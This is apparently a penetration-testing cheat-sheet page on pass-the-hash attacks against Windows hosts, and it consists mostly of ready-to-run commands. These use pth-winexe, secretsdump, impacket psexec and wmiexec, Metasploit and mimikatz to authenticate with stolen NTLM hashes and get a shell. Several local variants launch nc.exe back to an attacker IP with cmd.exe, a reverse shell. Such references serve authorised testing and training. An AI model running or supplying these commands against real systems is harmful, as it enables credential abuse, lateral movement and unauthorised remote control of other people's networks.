# Pass the Hash / Password

{% hint style="warning" %}
!**!! NTLMv2 hashes can not be passed !!!**

**only NTLM hashes can be passed**

FOR TOOLS THAT HAVE TO USE LM HASH**E**S BEFORE NTLM HASH, ADD A BLANK LM HASH:

_aad3b435b51404eeaad3b435b51404ee_
{% endhint %}

{% hint style="info" %}
We can pass hashes which are from: SAM Files, LSASS, NTDS.DIT

We can pass hashes between workgroup machines, domain members and domain controllers.
{% endhint %}

## <mark style="color:red;">Remote</mark>

Pass the hash remotely to gain a shell:

### <mark style="color:orange;">pth-winexe</mark>

```
pth-winexe -U <domain>/<username>%<hash> //<target-ip> cmd
```

Sometimes you may need to reference the target by its hostname (add an entry to /etc/hosts to make it resolve):

```
pth-winexe -U <domain>/<username>%<hash> //<target-hostname> cmd
```

Alternative:

```
export SMBHASH=<hash>
pth-winexe -U <domain>/<username>% //<target-ip> cmd
```

{% hint style="info" %}
remember the first hash portion is a blank LM hash between these signs : and %
{% endhint %}

### <mark style="color:orange;">secretsdump</mark>

```
secretsdump.py megacorp/hesher:"password123!"@192.168.56.116
```

### <mark style="color:orange;">psexec.py / winexec.py</mark>

```
python psexec.py "hesher":"password123!"@192.168.56.115

python psexec.py "hesher":@192.168.56.115 -hashes [nthash]

python wmiexec.py "hesher":"password123!"@192.168.56.115
```

### <mark style="color:orange;">metasploit psexec</mark>

```
use exploit/windows/smb/psexec
```

## <mark style="color:red;">Local</mark>

#### <mark style="color:green;">Pass the hash locally using runas:</mark>

```
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <hash> "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
```

#### <mark style="color:green;">Pass the hash locally using PowerShell:</mark>

```
secpasswd = ConvertTo-SecureString "<hash>" -AsPlainText -Force
mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\Windows\Temp\nc.exe","<attacker-ip> 53 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

#### <mark style="color:green;">Pass the hash locally using psexec:</mark>

```
psexec64 \\<hostname> -u <username> -p <hash> -h "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
```

#### <mark style="color:green;">pass the hash with mimikatz:</mark>

```
sekurlsa::pth /user:administrator /domain:. /ntlm:7ddade167a491d4f28eb25728469310e
```
